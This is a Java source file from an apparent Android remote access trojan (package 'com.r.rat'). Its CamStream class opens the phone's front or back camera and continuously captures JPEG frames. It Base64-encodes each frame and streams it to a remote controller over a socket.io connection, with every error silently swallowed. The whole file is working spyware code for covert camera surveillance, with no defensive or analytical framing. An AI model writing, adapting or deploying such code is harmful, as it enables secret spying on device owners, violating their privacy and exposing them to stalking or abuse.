package com.r.rat;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import io.socket.client.Socket;
import java.nio.ByteBuffer;
import java.util.Base64;
public class CamStream {
    private static CameraDevice dev;
    private static ImageReader reader;
    private static HandlerThread bg;
    public static void start(Context c, Socket s, String facing) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if ((facing.equals("front") && f == CameraCharacteristics.LENS_FACING_FRONT) ||
                    (facing.equals("back")  && f == CameraCharacteristics.LENS_FACING_BACK)) {
                    camId = id; break;
                }
            }
            if (camId == null) return;
            bg = new HandlerThread("cam"); bg.start();
            reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(r -> {
                try (Image img = r.acquireLatestImage()) {
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] arr = new byte[buf.remaining()]; buf.get(arr);
                    s.emit("cam", Base64.getEncoder().encodeToString(arr));
                } catch (Exception ignored) {}
            }, new Handler(bg.getLooper()));
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    dev = camera;
                    try {
                        CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        b.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        camera.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession sess) {
                                    try { sess.setRepeatingRequest(b.build(), null, new Handler(bg.getLooper())); }
                                    catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession sess) {}
                            }, new Handler(bg.getLooper()));
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); dev = null; }
                @Override public void onError(CameraDevice camera, int e) { camera.close(); dev = null; }
            }, new Handler(bg.getLooper()));
        } catch (Exception ignored) {}
    }
    public static void stop() {
        try { if (dev != null) dev.close(); } catch (Exception ignored) {}
        try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        if (bg != null) bg.quitSafely();
    }
}